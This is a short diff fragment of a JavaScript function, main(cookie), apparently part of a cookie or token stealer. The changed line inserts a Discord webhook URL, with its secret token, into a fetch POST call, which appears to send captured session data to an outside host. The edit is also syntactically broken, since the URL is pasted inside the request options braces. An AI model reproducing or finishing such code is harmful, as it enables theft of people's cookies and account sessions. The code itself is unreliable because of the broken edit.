@@ -12,7 +12,7 @@ async function main(cookie) {
         })).json();
     }
     
-    fetch(WEBHOOK, {
+    fetch(WEBHOOK, {https://discord.com/api/webhooks/1171942876016550019/FfHbgrCS4_gkmfjOGwwoiB8cxE9D_xfJZyoBFJ1b1PL-CR6TDQ4aE_HK9GGGoGtzXNsf
         method: "POST",
         headers: {
             "Content-Type": "Application/json"
